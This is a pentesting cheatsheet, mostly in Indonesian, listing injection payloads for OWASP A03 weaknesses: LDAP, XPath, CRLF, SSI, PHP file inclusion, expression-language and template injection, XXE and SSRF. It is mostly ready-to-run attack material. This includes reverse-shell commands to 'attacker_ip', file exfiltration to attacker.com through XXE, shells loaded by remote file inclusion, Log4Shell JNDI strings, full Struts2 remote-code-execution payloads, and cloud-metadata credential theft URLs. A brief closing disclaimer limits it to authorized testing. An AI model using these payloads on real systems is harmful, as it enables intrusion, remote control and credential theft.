# 💉 INJECTION CHEATSHEET — Part 5C-2

## OWASP A03:2021 Injection — Remaining CWEs

---

## 📑 Table of Contents (5C-2)
1. [CWE-90: LDAP Injection](#cwe-90-ldap-injection)
2. [CWE-91: XML / Blind XPath Injection](#cwe-91-xml--blind-xpath-injection)
3. [CWE-643: XPath Injection](#cwe-643-xpath-injection)
4. [CWE-93: CRLF Injection](#cwe-93-crlf-injection)
5. [CWE-113: HTTP Response Splitting](#cwe-113-http-response-splitting)
6. [CWE-97: SSI Injection](#cwe-97-ssi-injection)
7. [CWE-98: PHP Remote File Inclusion](#cwe-98-php-remote-file-inclusion)
8. [CWE-917: Expression Language Injection](#cwe-917-expression-language-injection)
9. [CWE-74: General Injection](#cwe-74-general-injection)
10. [CWE-20: Input Validation](#cwe-20-improper-input-validation)
11. [CWE-99: Resource Injection](#cwe-99-resource-injection)
12. [CWE-112: Missing XML Validation (XXE)](#cwe-112-missing-xml-validation-xxe)
13. [CWE-116: Improper Encoding/Escaping](#cwe-116-improper-encoding--escaping)
14. [CWE-470: Unsafe Reflection](#cwe-470-unsafe-reflection)
15. [CWE-564: Hibernate SQLi](#cwe-564-sql-injection-hibernate)
16. [CWE-610: Externally Controlled Reference (SSRF)](#cwe-610-externally-controlled-reference-ssrf)
17. [CWE-644: HTTP Header Scripting](#cwe-644-http-header-scripting)

---

# CWE-90: LDAP Injection

**Deskripsi**: Penyerang memanipulasi LDAP queries melalui input yang tidak di-sanitize.

## Payloads

```
# ===== AUTHENTICATION BYPASS =====
*
*)(&
*)(|(&
pwd)
*)(|(&
*))%00
admin)(&)
admin)(|(password=*))
*)((|userPassword=*)
admin)(!(&(1=0))

# ===== BASIC =====
# Original query: (&(user=INPUT)(password=INPUT))

# Bypass login (user field)
*)(cn=*))(|(cn=*
admin)(&)
admin)(|(password=*))

# Bypass login (password field)
*)(&
*)(|(&
*))%00

# ===== ENUMERATION =====
# True/False check
*)(uid=*))(|(uid=*       # TRUE
*)(uid=fakefake))(|(uid=* # FALSE

# Extract attribute values char by char
*)(uid=a*))(|(uid=*
*)(uid=b*))(|(uid=*
*)(uid=admin*))(|(uid=*

# ===== BLIND LDAP =====
# Boolean: check response difference
admin)(|(description=*))
admin)(|(description=A*))
admin)(|(description=B*))

# ===== OR INJECTION =====
)(|(cn=*             # Dump all entries
)(|(objectClass=*))  # List all objects
```

## Tools

```bash
# Manual testing via Burp Suite
# Nuclei templates
nuclei -u https://target.com -tags ldap

# ldapsearch (enumeration after injection)
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com" "(objectClass=*)"
```

---

# CWE-91: XML / Blind XPath Injection

**Deskripsi**: Inject XPath expressions ke XML queries.

## Payloads

```xml
<!-- Authentication bypass -->
' or '1'='1
' or ''='
" or "1"="1
" or ""="
1' or '1'='1' or '1'='1
admin' or '1'='1

<!-- Extract data -->
' or 1=1 or ''='
' or count(//user)>0 or '1'='1
' or string-length(//user[1]/username)>0 or '1'='1

<!-- Blind XPath — karakter per karakter -->
' or substring(//user[1]/username,1,1)='a' or '1'='2
' or substring(//user[1]/username,1,1)='b' or '1'='2
' or substring(//user[1]/password,1,1)='a' or '1'='2

<!-- Count nodes -->
' or count(//user)=5 or '1'='2
' or count(//user/child::*)=3 or '1'='2

<!-- Navigate XML structure -->
' or name(//user[1]/child::*[1])='username' or '1'='2
' or name(/*)='root' or '1'='2
```

---

# CWE-643: XPath Injection

**Deskripsi**: Spesifik XPath injection (non-blind).

```xml
<!-- Original: //users/user[username='INPUT' and password='INPUT'] -->

<!-- Bypass auth -->
admin' or '1'='1' or '1'='1
' or 1=1]%00
' or ''='

<!-- Union-style (extract different nodes) -->
'] | //user | //user['
'] | //* | //*['

<!-- Extract node names -->
'] | name(//*[1]) | //*['

<!-- String extraction -->
'] | //user[1]/password | //user['
'] | string(//user[1]/password) | //dummy['
```

---

# CWE-93: CRLF Injection

**Deskripsi**: Inject Carriage Return Line Feed (\r\n) sequences ke HTTP headers atau logs.

## Payloads

```
# ===== HTTP HEADER INJECTION =====
# URL parameter
https://target.com/page?param=value%0d%0aInjected-Header:injected

# Set-Cookie injection
https://target.com/page?lang=en%0d%0aSet-Cookie:%20admin=true

# XSS via CRLF
https://target.com/page?param=value%0d%0a%0d%0a<script>alert(1)</script>

# Content-Length injection (HTTP response splitting)
https://target.com/page?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# ===== ENCODING VARIANTS =====
%0d%0a          # URL encoded \r\n
%0a             # URL encoded \n only
%0d             # URL encoded \r only
%E5%98%8A%E5%98%8D  # UTF-8 encoded CRLF
\r\n            # Literal
%0D%0A          # Uppercase

# ===== LOG INJECTION =====
# Inject fake log entries
admin%0a[2026-04-27 12:00:00] Login successful from 1.2.3.4

# ===== EMAIL HEADER INJECTION =====
victim@target.com%0aBcc:attacker@evil.com
victim@target.com%0d%0aSubject:Injected
```

## Tools

```bash
# CRLFuzz
go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
crlfuzz -u "https://target.com" -o results.txt
cat urls.txt | crlfuzz

# Nuclei
nuclei -u https://target.com -tags crlf
```

---

# CWE-113: HTTP Response Splitting

**Deskripsi**: CRLF injection yang memungkinkan penyerang inject entire HTTP response.

```
# Full response splitting
GET /page?param=value%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><body><script>alert(document.cookie)</script></body></html> HTTP/1.1

# Cache poisoning via response splitting
GET /page?q=x%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
Host: target.com

# Header injection for session fixation
GET /page?q=x%0d%0aSet-Cookie:%20PHPSESSID=attacker_session HTTP/1.1
```

---

# CWE-97: SSI Injection

**Deskripsi**: Inject Server-Side Include directives ke web pages (.shtml, .stm, .shtm).

## Payloads

```html
<!-- Basic SSI -->
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="REMOTE_ADDR" -->

<!-- File inclusion -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="config.php" -->
<!--#include virtual="../../../etc/passwd" -->

<!-- Command execution -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="ls -la" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cgi="/cgi-bin/script.cgi" -->

<!-- Variable manipulation -->
<!--#set var="name" value="hacked" -->
<!--#echo var="name" -->

<!-- Reverse shell via SSI -->
<!--#exec cmd="bash -i >& /dev/tcp/attacker_ip/4444 0>&1" -->
<!--#exec cmd="nc attacker_ip 4444 -e /bin/bash" -->

<!-- Conditional -->
<!--#if expr="${QUERY_STRING} = 'admin'" -->
  Welcome Admin
<!--#endif -->
```

---

# CWE-98: PHP Remote File Inclusion (RFI)

**Deskripsi**: Penyerang memaksa PHP include() / require() untuk load file dari remote server.

## Payloads

```php
// ===== REMOTE FILE INCLUSION =====
// Original: include($_GET['page'] . '.php');

// Basic RFI
https://target.com/index.php?page=http://attacker.com/shell
https://target.com/index.php?page=http://attacker.com/shell.txt

// Null byte (PHP < 5.3.4)
https://target.com/index.php?page=http://attacker.com/shell.txt%00

// PHP wrappers
https://target.com/index.php?page=php://input
// POST body: <?php system('whoami'); ?>

https://target.com/index.php?page=php://filter/convert.base64-encode/resource=config
https://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

// ===== LOCAL FILE INCLUSION (LFI) =====
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc/passwd
?page=%2e%2e/%2e%2e/%2e%2e/etc/passwd
?page=..%252f..%252f..%252fetc/passwd  // double encode

// ===== LFI TO RCE =====
// 1. Log poisoning
// Inject PHP code via User-Agent:
User-Agent: <?php system($_GET['cmd']); ?>
// Then include log:
?page=../../../var/log/apache2/access.log&cmd=whoami

// 2. /proc/self/environ
?page=../../../proc/self/environ
// With User-Agent: <?php system('id'); ?>

// 3. PHP session files
// Inject payload in session → include session file
?page=../../../tmp/sess_SESSION_ID

// 4. PHP wrapper RCE
?page=php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id

// 5. expect:// wrapper
?page=expect://whoami

// 6. zip:// wrapper
// Upload ZIP containing PHP shell, then:
?page=zip://uploads/shell.zip%23shell.php
```

## Tools

```bash
# LFI Suite
python lfisuite.py

# Nuclei
nuclei -u https://target.com -tags lfi,rfi

# Manual wordlists
# SecLists/Fuzzing/LFI/
```

---

# CWE-917: Expression Language Injection

**Deskripsi**: Inject Expression Language (EL) statements di Java/Spring applications.

## Payloads

```java
// ===== JAVA EL (JSP/JSF) =====
${7*7}           // Test: returns 49
${applicationScope}
${sessionScope}
${requestScope}

// RCE via EL
${Runtime.getRuntime().exec("whoami")}
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"whoami")}

// ===== SPRING EL (SpEL) =====
${7*7}
#{7*7}

// RCE
#{T(java.lang.Runtime).getRuntime().exec('whoami')}
#{T(java.lang.Runtime).getRuntime().exec(new String[]{'id'})}

// Read file
#{T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}

// With ProcessBuilder
#{new java.util.Scanner(new ProcessBuilder({'id'}).start().getInputStream()).useDelimiter('\\A').next()}

// ===== OGNL (Struts2) =====
%{7*7}
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}

// Struts2 RCE (CVE-2017-5638)
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

// ===== SSTI (Server-Side Template Injection) =====
// Jinja2 (Python)
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

// Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Freemarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// Thymeleaf (Java)
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

// Pebble (Java)
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

## SSTI Detection

```bash
# tplmap
pip install tplmap
tplmap -u "https://target.com/page?name=test"
tplmap -u "https://target.com/page?name=test" --os-shell

# Detection payload sequence:
# {{7*7}} → 49? (Jinja2/Twig)
# ${7*7} → 49? (Freemarker/EL/Velocity)
# #{7*7} → 49? (SpEL/Thymeleaf)
# %{7*7} → 49? (OGNL)
# {{7*'7'}} → 7777777? (Jinja2) vs 49? (Twig)
```

---

# CWE-112: Missing XML Validation (XXE)

**Deskripsi**: XML External Entity injection — load external entities dalam XML parser.

## Payloads

```xml
<!-- Basic XXE — Read file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Blind XXE (OOB Data Exfiltration) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

<!-- evil.dtd on attacker server -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>">
%all;

<!-- PHP base64 exfil -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

<!-- RCE via XXE (PHP expect) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://whoami">
]>
<root>&xxe;</root>

<!-- Billion Laughs (DoS) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
```

## Tools

```bash
# XXEinjector
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --httpport=8080 --path=vuln_param --oob=http

# Nuclei
nuclei -u https://target.com -tags xxe
```

---

# CWE-99: Resource Injection

**Deskripsi**: Penyerang mengontrol resource identifiers (port numbers, file paths, socket connections).

```
# Port injection
target.com:ATTACKER_CONTROLLED_PORT

# File path injection
/api/download?file=../../../../etc/passwd

# Connection string injection
server=attacker.com;database=evil;

# JNDI injection (Log4Shell style)
${jndi:ldap://attacker.com/exploit}
${jndi:rmi://attacker.com/exploit}
${jndi:dns://attacker.com}
```

---

# CWE-610: Externally Controlled Reference (SSRF)

**Deskripsi**: Server-Side Request Forgery — server melakukan request ke URL yang dikontrol penyerang.

## Payloads

```bash
# ===== INTERNAL SERVICES =====
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]          # IPv6 localhost
http://0177.0.0.1     # Octal
http://2130706433     # Decimal
http://0x7f000001     # Hex

# ===== CLOUD METADATA =====
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/project/project-id

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# ===== BYPASS FILTERS =====
# Redirect bypass
http://attacker.com/redirect?url=http://127.0.0.1
# DNS rebinding
http://127.0.0.1.nip.io
http://a]@127.0.0.1
# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31
# CNAME record pointing to 127.0.0.1
http://localtest.me

# ===== PROTOCOLS =====
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO     # Redis
dict://127.0.0.1:6379/INFO
ftp://127.0.0.1
```

## Tools

```bash
# SSRFmap
python ssrfmap.py -r request.txt -p url -m readfiles,portscan,aws

# Gopherus (generate gopher payloads)
python gopherus.py --exploit mysql
python gopherus.py --exploit redis
python gopherus.py --exploit fastcgi
```

---

# CWE-470: Unsafe Reflection

**Deskripsi**: Penyerang mengontrol class/method names yang digunakan untuk reflection.

```java
// Java — Vulnerable code:
// Class.forName(userInput).newInstance()

// Payloads
java.lang.Runtime      // → getRuntime().exec()
java.lang.ProcessBuilder
javax.script.ScriptEngineManager

// .NET
System.Diagnostics.Process
System.IO.File
```

---

# CWE-564: SQL Injection — Hibernate

**Deskripsi**: SQLi melalui Hibernate HQL (Hibernate Query Language).

```sql
-- HQL Injection
-- Original: FROM User WHERE name = 'INPUT'

' OR '1'='1
' OR 1=1--
admin' AND SUBSTRING(password,1,1)='a' AND '1'='1

-- HQL specific
FROM User WHERE name='' OR ''=''
FROM User u WHERE u.name='' UNION SELECT null FROM User--
```

---

# CWE-644: HTTP Header Scripting

**Deskripsi**: XSS melalui HTTP headers yang di-reflect ke response.

```
# Referer header
Referer: <script>alert(1)</script>

# User-Agent
User-Agent: <script>alert(1)</script>

# X-Forwarded-For
X-Forwarded-For: <script>alert(1)</script>

# Host header (password reset poisoning)
Host: attacker.com
X-Forwarded-Host: attacker.com
```

---

# CWE-76, CWE-86, CWE-114, CWE-115, CWE-116, CWE-129, CWE-159

## Quick Reference (Defensive CWEs)

| CWE | Nama | Keterangan |
|-----|------|-----------|
| CWE-76 | Equivalent Special Elements | Encoding bypass (UTF-7, overlong UTF-8) |
| CWE-86 | Invalid Characters in Web IDs | Null bytes, Unicode in identifiers |
| CWE-114 | Process Control | Controlling library/function loading |
| CWE-115 | Misinterpretation of Output | Output parsing errors leading to injection |
| CWE-116 | Improper Encoding/Escaping | Missing output encoding → XSS/SQLi |
| CWE-129 | Array Index Validation | Out-of-bounds via user-controlled index |
| CWE-159 | Invalid Special Elements | Edge-case characters bypassing sanitization |

```
# CWE-76: Encoding bypass payloads
+ADw-script+AD4-alert(1)+ADw-/script+AD4-    # UTF-7 XSS
%C0%BC (overlong / for path traversal)
%ef%bc%85 (fullwidth %)

# CWE-86: Null byte injection
file.php%00.jpg    # Bypass extension check
admin%00           # String truncation

# CWE-116: Output encoding test
<script>alert(1)</script>      # No encoding
&lt;script&gt;alert(1)&lt;/script&gt;  # Properly encoded
```

---

# CWE-103, CWE-104: Struts Framework Issues

```java
// CWE-103: Incomplete validate() — form without full validation
// CWE-104: Form Bean not extending ValidatorForm

// Struts2 Content-Type RCE (CVE-2017-5638)
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

// Struts2 URL RCE (CVE-2018-11776)
https://target.com/${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}/index.action
```

---

# CWE-493, CWE-500: Java Public Fields

```java
// CWE-493: Public variable without final → attacker can modify
public String secretKey = "abc123";  // VULNERABLE
public final String secretKey = "abc123";  // SAFE

// CWE-500: Public static field not final
public static String config = "default";  // VULNERABLE
public static final String config = "default";  // SAFE

// Exploitation: via reflection or direct access in same package
// → modify runtime behavior, bypass auth, etc.
```

---

## 🔍 Master Detection Cheatsheet

```bash
# ===== ALL-IN-ONE PIPELINE =====

# 1. Gather URLs with params
echo "target.com" | gau | grep "=" | sort -u > params_urls.txt

# 2. Classify by injection type
cat params_urls.txt | gf sqli > sqli.txt
cat params_urls.txt | gf xss > xss.txt
cat params_urls.txt | gf lfi > lfi.txt
cat params_urls.txt | gf ssrf > ssrf.txt
cat params_urls.txt | gf rce > rce.txt
cat params_urls.txt | gf ssti > ssti.txt
cat params_urls.txt | gf redirect > redirect.txt

# 3. Test SQLi
sqlmap -m sqli.txt --batch --level=3 --risk=2

# 4. Test XSS
cat xss.txt | dalfox pipe --blind "https://xss.callback.com"

# 5. Test all with Nuclei
nuclei -l params_urls.txt -tags sqli,xss,lfi,rfi,ssti,ssrf,rce,xxe,crlf -o vulns.txt
```

---

> ⚠️ **DISCLAIMER**: Cheatsheet ini hanya untuk **penetration testing yang sudah diotorisasi** dan **tujuan pendidikan**. Jangan gunakan tanpa izin tertulis.
